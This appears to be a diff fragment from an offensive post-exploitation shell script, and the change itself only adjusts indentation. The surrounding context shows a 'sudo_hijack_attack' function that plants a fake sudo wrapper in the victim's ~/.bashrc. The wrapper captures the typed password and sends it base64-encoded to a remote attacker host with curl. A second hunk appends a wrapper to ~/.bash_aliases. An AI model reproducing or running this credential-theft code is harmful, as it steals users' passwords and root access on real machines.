@@ -94,7 +94,7 @@ then
 	else
 		$REALBIN "${@:1}"
 	fi
-		}' >> ~/.bash_aliases
+	}' >> ~/.bash_aliases
 fi
 
 # PHP, Perl, Node, JJS, are broken; going to fix
@@ -198,7 +198,7 @@ sudo_hijack_attack () {
 			curl -k -s "https://'$RHOST'/$encoded" > /dev/null 2>&1
 			$realsudo -S <<< "$inputPasswd" -u root bash -c "exit" > /dev/null 2>&1
 			$realsudo "${@:1}"
-		}' >> ~/.bashrc
+			}' >> ~/.bashrc
 	echo -e "\e[92m[+]\e[0m Hijacked $(whoami)'s sudo access"
 	echo "[+] Password will be Stored in $PASSWDFILE"
 	echo "[+] $PASSWDFILE will be exfiltrated to https://$RHOST/ as a base64 encoded GET parameter"
